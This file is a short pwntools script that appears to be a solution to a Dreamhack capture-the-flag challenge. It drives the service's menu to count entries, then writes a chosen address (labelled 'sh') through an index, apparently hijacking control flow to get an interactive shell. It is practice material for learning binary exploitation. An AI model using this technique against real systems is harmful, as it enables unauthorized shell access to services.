from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 16425
r = remote(HOST, PORT)

i=0

while 1:
    r.sendlineafter(b'>> ', b'1')
    r.recvline()
    res = r.recvline()
    if b'nothing' in res:
        continue
    elif b'undiscovered' in res:
        r.sendlineafter(b': ', b'AAAA')
        i+=1
        continue
    break

sh=0x402576
r.sendlineafter(b'>> ', b'3')
r.sendlineafter(b': ', b'%d'%i)
r.sendlineafter(b': ', p64(sh))
r.sendlineafter(b'>> ', b'2')

r.interactive()